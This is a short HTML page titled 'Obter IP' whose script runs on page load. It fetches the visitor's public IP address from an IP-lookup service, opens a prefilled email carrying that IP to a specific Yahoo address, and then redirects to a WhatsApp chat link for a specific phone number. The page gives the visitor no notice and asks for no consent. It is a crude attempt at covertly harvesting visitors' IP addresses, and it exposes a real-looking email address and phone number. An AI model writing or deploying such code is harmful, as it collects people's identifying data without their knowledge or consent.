<!DOCTYPE html>
<html>
<head>
    <title>Obter IP</title>
</head>
<body>
    <script>
        function getIp() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const emailUrl = `mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=O endereço IP do usuário é: ${ip}`;
                    const whatsappUrl = 'https://wa.me/27998041981';
                    window.location.href = emailUrl;
                    setTimeout(function() {
                        window.location.href = whatsappUrl;
                    }, 2000);
                })
                .catch(error => console.error(error));
        }

        getIp();
    </script>
</body>
</html>
